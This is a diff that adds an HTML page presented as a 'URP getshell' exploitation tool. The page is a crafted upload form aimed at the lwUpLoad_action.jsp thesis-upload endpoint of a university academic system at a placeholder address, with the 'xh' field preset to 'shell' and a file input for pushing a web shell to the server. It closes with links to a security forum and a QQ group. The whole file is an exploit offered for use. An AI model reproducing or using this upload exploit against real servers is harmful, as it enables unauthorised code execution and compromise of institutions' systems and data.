@@ -1,0 +1,75 @@
+﻿<html>
+<head>
+<title>习科联创urp getshell利用工具</title>
+</head>
+
+<body>
+<form action="http://xxx.xx.xx.xx/lwUpLoad_action.jsp" enctype="multipart/form-data" method="post">
+    <input type="text" name="xh" value="shell">
+    <input type="text" name="zxjxjhh" value="">
+    <input type="text" name="actionType" value="">
+    <input type="text" name="tmbh" value="">
+    
+    
+    
+    
+    
+    
+        <table width="500" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#000000">
+
+            <tr>
+          <td bgcolor="#FFFFFF" width="25%" height="20">Word版本号</td>
+          <td bgcolor="#FFFFFF" width="25%" height="20">
+            <select name="lwywwbb">
+              <option value="">请选择</option>
+              <option value="Word2000">Word 2000</option>
+              <option value="Word2003">Word 2003</option>
+              <option value="Word2007">Word 2007</option>
+            </select>
+          </td>
+          <td bgcolor="#FFFFFF" width="50%" colspan="2">
+            <font color="red">* 如果提交论文是Word类型，请选择版本号.</font>
+          </td>
+        </tr>
+        <tr>
+          <td bgcolor="#FFFFFF" width="25%" height="20">&nbsp;</td>
+          <td bgcolor="#FFFFFF" width="25%" height="20">&nbsp;</td>
+          <td bgcolor="#FFFFFF" width="75%" height="20" colspan="2">
+            <font color="red">* 如果提交论文是latex类型，请上传.zip文件</font>
+          </td>
+        </tr>
+        <tr>
+          <td colspan="4" bgcolor="#FFFFFF">
+            <table border="0" align="right" cellpadding="0" cellspacing="0">
+              <tr>
+                <td>
+                  <p>                    请选择论文格式
+                    <input type="radio" name="wjlx" checked="checked" value="doc" onclick="doChange('word')"/>
+                    word
+                    <input type="radio" name="wjlx" value="zip" onclick="doChange('latex')"/>
+                    latex
+                    <input type="radio" name="wjlx" value="pdf" onclick="doChange('pdf')"/>
+                    pdf
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                  </p>
+                  <p>                    提交论文
+                   <input type="file" name="theFile"/>
+                    <br/>
+                  </p>
+                </td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+    </table>
+
+      <input type="submit" name="upload" value="提交"/>
+
+</form>
+<a href="http://bbs.isilic.org" target="_blank">习科联创网络信息安全论坛</a><br>
+<a href="http://bbs.isilic.org/?6269" target="_blank">zippo</a><br>
+习科联创官方qq群：152834264<br>
+
+</body>
+
+</html>
